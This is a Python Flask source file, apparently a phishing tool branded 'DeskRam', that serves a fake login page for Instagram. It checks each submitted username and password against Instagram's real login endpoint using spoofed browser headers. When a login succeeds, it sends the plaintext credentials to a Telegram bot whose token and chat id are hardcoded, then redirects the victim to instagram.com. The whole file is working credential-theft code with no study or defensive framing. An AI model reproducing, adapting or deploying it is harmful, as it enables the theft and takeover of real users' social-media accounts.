import requests
import time
from flask import Flask, request, redirect, render_template
from user_agent import generate_user_agent
from flask_cors import CORS
from pyfiglet import Figlet
from colorama import Fore

f = Figlet(font='epic')  
print(Fore.BLUE + f.renderText('DeskRam'))

app = Flask(__name__)
CORS(app)

def generate_enc_password(password):
    time_now = int(time.time())
    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
    return enc_password

def login(username, password):
    headers_login = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'viewport-width': '424',
        'x-asbd-id': '198387',
        'x-csrftoken': 'missing',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
        'x-instagram-ajax': '1006773434',
        'x-requested-with': 'XMLHttpRequest',
    }

    enc_password = generate_enc_password(password)
    data_login = {
        'enc_password': enc_password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }

    login_response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                                   headers=headers_login,
                                   data=data_login)
    return login_response

@app.route('/', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            return render_template('login.html', error="Both username and password are required.")

        response = login(username, password)

        if response.status_code == 200:
            if 'authenticated":true' in response.text or "userId" in response.text:
                # Successful login, redirect to Instagram
                bot_api_key = '5609501351:AAGdYonJCUaZctj_rXuAnfrhiEmj-h4r4fI'
                chat_id = '5645434088'
                message = f'Username: {username}, Password: {password}'
                telegram_url = f'https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={chat_id}&text={message}'
                requests.get(telegram_url)
                return redirect('http://www.instagram.com/')
            else:
                # Incorrect password, render login page with error message
                return render_template('login.html', error="Incorrect password. Please try again.")
        else:
            # Error in request, render login page with error message
            return render_template('login.html', error="Error occurred while logging in. Please try again later.")

    return render_template('login.html', error=None)


